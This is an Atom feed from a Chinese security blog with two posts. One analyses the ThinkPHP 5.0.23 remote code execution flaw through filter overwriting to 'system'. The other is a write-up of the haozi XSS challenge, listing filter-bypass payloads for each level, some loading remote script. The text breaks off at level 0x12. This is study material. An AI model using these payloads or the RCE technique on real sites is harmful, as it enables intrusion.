<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风之栖息地</title>
  
  <subtitle>habitat of wind</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hurricane618.me/"/>
  <updated>2019-02-03T02:16:41.182Z</updated>
  <id>https://hurricane618.me/</id>
  
  <author>
    <name>hurricane618</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>thinkphp 5.0.23 rce分析和复现</title>
    <link href="https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/"/>
    <id>https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/</id>
    <published>2019-02-03T02:08:15.000Z</published>
    <updated>2019-02-03T02:16:41.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>入口是在app::run()，这里有创建http的请求实例，</p><img src="/2019/02/03/thinkphp-5-0-23-rce/1.png"><p>随后在后面会有路由检查，从这里跟进函数<code>routeCheck</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/2.png"><p>在路由检查中会到路由类的check方法处，继续跟进。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/3.png"><p>在check中会有获取当前方法的method</p><img src="/2019/02/03/thinkphp-5-0-23-rce/4.png"><p>下面在method中会获取<code>var_method</code>这个伪变量，其实这个就是我们通过post传进的<code>_method</code>，这里进入判断之后会将我们post的值当做Request类的方法调用，这里我们的poc是传入的<code>__construct</code>，这样就会调用它的构造方法，并且参数是post数据。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/5.png"><p>继续跟进构造方法，这里的foreach会遍历所有变量，将存在的参数全部覆盖掉，在我们传入的参数中的filter，就把之前的覆盖了，并且在这里传入method为get的原因也是因为之前注册路由是get方法，所以这里要把请求的method覆盖成get，避免报错。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/6.png"><p>在这调用完成之后<code>routeCheck</code>将返回<code>method</code>赋值给<code>dispatch</code>。之后会继续在run函数里面执行exec函数。由于type为method执行相应的分支。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/7.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/8.png"><p>而这里的<code>param</code>方法能获取参数，并且和URL中的参数合并。这里得到的参数就是post数据中的<code>get[]=dir</code></p><img src="/2019/02/03/thinkphp-5-0-23-rce/9.png"><p>它的返回调用了<code>input</code>方法，跟进<code>input</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/10.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/11.png"><p><code>input</code>最后将参数和<code>filter</code>一起传入<code>array_walk_recursive</code>中。其中参数中有我们传的<code>dir</code>，而<code>filter</code>通过<code>getFilter</code>有我们传的<code>system</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/12.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/13.png"><p>在这之后调用的<code>array_walk_recursive</code>会用<code>filterValue</code>，来处理数据，在这之中用<code>call_user_func</code>。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/14.png"><p>这里<code>system</code>和<code>dir</code>分别是filter和value中的值，凑在一起就触发命令执行。</p><p>这里是第一个poc的分析，而第二个poc比较类似，同样是利用input函数，这里利用的点是在param的<code>$this-&gt;method(true)</code>中。</p><p>因为是true所以进入了<code>server(&#39;REQUEST_METHOD&#39;)</code>，最后同样到input中，并且data是server数组，filter同样是system。</p><img src="/2019/02/03/thinkphp-5-0-23-rce/15.png"><p>造成的效果都是命令执行。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><img src="/2019/02/03/thinkphp-5-0-23-rce/16.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/17.png"><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在调试的过程中也算是学到了很多东西，比如vscode+xdebug的动态调试方案，特别的轻巧，功能点也很完善。关于在验证poc的时候其实出了一些小问题，那就是我的burp发送的post数据和header之前多了一个空行，也就是这个多的空行导致我的poc老是失败……这也是注意小的细节问题，只有在真正调试的时候才会被发现。</p><p>以后还是要多动手实践。接下来几天我会研究一点新的东西，拭目以待吧。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">https://paper.seebug.org/787/</a></p><p><a href="https://blog.csdn.net/qq_29647709/article/details/86307859" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/86307859</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;入口是在app::run()，这里有创建http的请求实例，&lt;/p&gt;
&lt;img src=&quot;/2019/02/03/thinkphp-5-0-
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>haozi xss 挑战赛 writeup</title>
    <link href="https://hurricane618.me/2019/01/27/haozi-xss-challenges/"/>
    <id>https://hurricane618.me/2019/01/27/haozi-xss-challenges/</id>
    <published>2019-01-27T13:38:32.000Z</published>
    <updated>2019-01-27T13:40:36.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没什么说的，div标签+没过滤直接插 <code>&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入点在<code>&lt;textarea&gt;</code>这种标签中，需要闭合标签，在插入payload。<code>&lt;/textarea&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入点在input标签的value属性中，然而依旧没有过滤，只要逃逸双引号再插其他标签就好。<code>1&quot;&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>()</code>，直接换成反引号就可以了。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反引号也GG，只好编码了这里用js编码。<code>&lt;img src=1 onerror=&#39;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&#39;&gt;</code></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始一头雾水，搞了编码无法解析，有查注释网上又没有…… 看了其他人的writeup之后，结果果然是多样性的注释。</p><p>这里在html里面的注释中有两种除了一般的<code>&lt;!-- --&gt;</code> 还有对称的写法<code>&lt;!-- --!&gt;</code> ，所以这里没过滤对称写法，所以就用这种就可以逃逸过滤插标签。<code>--!&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好吧，尝试了很久，想到了这种出现在标签内部的输入点，有两种思路，一个是在标签内部的属性和事件来触发js；一个是闭合现在的标签去插入新的攻击向量。想了老久不知道怎么破……看了writeup得知是利用换行，这里就有一个小细节了，这里的正则是<code>on.*=</code>这意味着<code>on</code>和<code>=</code>是以一个整体去判断的，这种以整体形式去做判断的逻辑可以用一些拆分技巧了绕过。所以正确的payload为<code>onmousemove换行=alert(1)</code>。</p><p>这里试了很久都没找到非交互的操作，最后还是只有交互操作触发xss。</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知识点：利用浏览器的自动补全特性绕过……又是一个老知识点就是没想到这个点，想到了要在<code>&lt;&gt;</code>上做文章，没想到自动补全。。。记个笔记当标签不完整的时候<code>&lt;img src=1 onerror=alert(1)</code> ，像这样浏览器会自动把末尾的<code>&gt;</code>用其他的标签补充上。实际自动补充如下图：</p><img src="/2019/01/27/haozi-xss-challenges/1.png"><p>而我们的输入拼接上实际上是这样的<code>&lt;article&gt;&lt;img src=1 onerror=alert(1) &lt;/article&gt;</code></p><p>可以看到原来的<code>&lt;/article&gt;</code>成了img标签中的一部分，随后浏览器又在后面补充了一个<code>&lt;/article&gt;</code>。</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点依旧是正则过滤的问题，这里的过滤规则写的太死，所以可以在中间加入空格或者换行来绕过。</p><p><code>&lt;/style &gt;&lt;img src=1 onerror=alert(1)&gt;</code>或者<code>&lt;/style换行&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然限制了必须要在<code>www.segmentfault.com</code>这个域下，但是也没过滤其他危险字符，那我们直接闭合前面的script然后在后面构造自己的恶意脚本就行。<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://xss.haozi.me/j.js</code></p><p>上面是利用双引号字符去结合构造的payload，也可以直接注释掉。<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题是上道题目的加强版，把多余的特殊字符都转义成html实体了，这样就没有办法突破src这个字符串，突破口只能在src这里。观察发现没有过滤<code>@</code>和<code>#</code>想到应该是要用到url相关的trick。把orange的ppt翻出来复习，试了<code>@</code>和<code>#@</code>都不行。。。一脸懵逼</p><p>最后去看了其他人的writeup，答案是<code>https://www.segmentfault.com@xss.haozi.me/j.js</code></p><p>利用<code>@</code>的子资源请求功能去请求恶意的js，然而我是用chrome来做题的，之前半天没反应，在控制台看了看，发现chrome禁用了子资源请求。太尴尬了……</p><img src="/2019/01/27/haozi-xss-challenges/2.png"><img src="/2019/01/27/haozi-xss-challenges/3.png"><p>最后在火狐测试成功，chrome的安全性真是高。</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题是把输入全部转成大写字母，这样的话<code>alert</code>就没有办法执行。但是我们有编码啊，并且大小写对标签和属性事件是一样的，所以只要把<code>alert(1)</code>的部分换成js编码就ok了。</p><p><code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmm，这个题目有点水啊……就是多过滤了一个script，那不用script就好了，方法多的用不过来而且上一次payload同样有效。<code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种输入点出现在js的单行注释区域，可以用换行绕过单行注释。剩下的一步思考了很多，由于过滤了<code>&lt;/&quot;&#39;</code>，不能闭合末尾的<code>&#39;)</code>，也不能用普通的注释<code>//</code>，<code>/*</code>，<code>&lt;!--</code>。看了看writeup，结果是用<code>--&gt;</code>，我有点傻眼了，什么鬼……</p><p>测试了一会儿，得出结论：<code>--&gt;</code>有和<code>//</code>一样的效果，同样是单行注释。这个真的是涨姿势了，以前只知道用上面的三种，结果现在又来一种。</p><p>payload：<code>换行alert(1)换行--&gt;</code></p><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样想了老久，看了其他人的思路恍然大悟……这里由于把所有的标签前面都加了下划线，基本上正常使用的标签都GG。然而这里要用到之前的一个知识点，那就是出现在这种有大小写转换的地方，有些特殊字符在转换的时候也会变成正常的英文大写字母。参考：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>能利用的是i和s，这里用特殊字符绕过正则，然后通过大写函数转换成正常字母达到目的。<code>&lt;ımg src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code>或者<code>&lt;ſcript src=https://xss.haozi.me/j.js&gt;&lt;/script&gt;</code></p><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的编码除了实体编码是强行变成字符串，其他的<code>&amp;#</code>类编码都是可以用的，典型的纸老虎过滤。所以这里从单引号逃逸出来，插入alert，过滤后面的无用部分。</p><p><code>&#39;);alert(1);//</code></p><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题有点莫名其妙。。。随手输入了一个<code>alert(1)</code>就成功了。。。都不知道发生了什么。</p><p>看了其他人的答案都是闭合语句，然后插入的<code>alert(1)</code>。<code>1;alert(1);</code></p><p>查了一下window的属性列表，没有data属性，所以这里直接输入<code>alert(1)</code>就会触发弹窗。</p><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是一个纸老虎过滤，在js的字符串中代入反斜线会被解释成转义符，但是由于原本整体就是字符串所以转义符转义过后还是字符串，等于没有意义，所以直接闭合前面的<code>console.log</code>插入js语句。</p><p><code>&#39;console.log(&quot;\&quot;)\/\/&#39;</code> 像这样的字符串实际上为<code>&#39;console.log(&quot;&quot;)//&#39;</code>。可以看到反斜线在字符串中没有任何作用。</p><p>最后payload：<code>&quot;);alert(&quot;1</code>或者<code>&quot;);alert(1)//</code></p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><figure class="highlight 